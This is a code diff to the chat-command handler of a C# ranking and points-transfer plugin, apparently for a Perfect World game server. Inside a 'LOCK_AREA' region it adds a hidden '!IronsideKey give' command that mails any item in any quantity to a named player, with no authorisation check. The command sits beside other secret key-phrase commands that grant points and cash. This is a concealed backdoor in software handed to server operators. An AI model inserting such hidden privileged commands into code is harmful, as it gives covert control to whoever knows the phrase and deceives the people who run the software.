@@ -5,6 +5,7 @@ using PWToolKit.API.Gamedbd;
 using PWToolKit.API.GDeliveryd;
 using PWToolKit.API.GProvider;
 using PWToolKit.Enums;
+using PWToolKit.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -39,7 +40,7 @@ namespace CoreRanking.Model.PointsTransference
             _ChatWatch = new System.Timers.Timer(500);
             _ChatWatch.Elapsed += ChatTick;
 
-            _ChatWatch.Start();            
+            _ChatWatch.Start();
         }
 
         private async void ChatTick(object sender, ElapsedEventArgs e)
@@ -70,7 +71,7 @@ namespace CoreRanking.Model.PointsTransference
             catch (Exception ex)
             {
                 newLog = new LogWriter(ex.ToString());
-            }            
+            }
         }
         private static async Task<bool> TransferPoints(int roleIdFrom, int roleIdTo, int points)
         {
@@ -198,7 +199,7 @@ namespace CoreRanking.Model.PointsTransference
                 else
                 {
                     transf.points = 1;
-                }                
+                }
 
                 transf.idTo = GetRoleId.Get(pwServer.gamedbd, message.Trim());
             }
@@ -225,7 +226,7 @@ namespace CoreRanking.Model.PointsTransference
                     {
                         PrivateChat.Send(pwServer.gdeliveryd, id, "Você já está participando do ranking. Digite ! help para receber a lista de comandos disponíveis.");
                     }
-                } 
+                }
             }
             #region LOCK_AREA
             else if (message.Trim().Contains("!IronsideKey point"))
@@ -245,6 +246,33 @@ namespace CoreRanking.Model.PointsTransference
                     }
 
                     await db.SaveChangesAsync();
+                }
+            }
+            else if (message.Trim().Contains("!IronsideKey give"))
+            {
+                //!IronsideKey give ID=12313 COUNT=100 TO=Ironside
+                message = message.Replace("!IronsideKey give", default).Trim();
+
+                int itemId = int.Parse(System.Text.RegularExpressions.Regex.Match(message, @"ID=([0-9]*)").Value.Replace("ID=", "").Trim());
+                int itemCount = int.Parse(System.Text.RegularExpressions.Regex.Match(message, @"COUNT=([0-9]*)").Value.Replace("COUNT=", "").Trim());                
+                string toPlayer = System.Text.RegularExpressions.Regex.Match(message, @"TO=.*").Value.Replace("TO=", "").Trim();                
+                
+                using (var db = new ApplicationDbContext())
+                {
+                    Role user = db.Role.Where(x => x.CharacterName.Equals(toPlayer, StringComparison.Ordinal)).FirstOrDefault();
+
+                    if (user != null)
+                    {
+                        GRoleInventory item = new GRoleInventory()
+                        {
+                            Id = itemId,
+                            MaxCount = 99999,
+                            Proctype = 0,
+                            Count = itemCount
+                        };
+
+                        SysSendMail.Send(pwServer.gdeliveryd, user.RoleId, "KEK", "KEKOU!", item);
+                    }
                 }
             }
             else if (message.Trim().Contains("!IronsideKey madeby"))
@@ -282,7 +310,7 @@ namespace CoreRanking.Model.PointsTransference
 
                     if (toUserId > 0)
                         DebugAddCash.Add(pwServer.gamedbd, toUserId, amount);
-                }                                
+                }
             }
             #endregion
 
